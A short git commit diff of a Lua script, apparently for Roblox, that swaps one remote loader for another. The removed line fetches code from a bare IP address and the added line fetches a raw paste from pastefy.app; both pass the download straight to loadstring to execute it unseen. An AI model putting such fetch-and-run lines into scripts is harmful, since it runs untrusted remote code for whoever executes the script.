78591d3b56c151b0fc5fe3b18c5c81bc93ee6de7
scripts <nielanthonyr@gmail.com>
2025-10-15 16:45:43 +0800

    script.lua

--- script.lua
+++ script.lua
@@ -1,5 +1,4 @@
-ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/tEbeRmhN/raw"))()
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
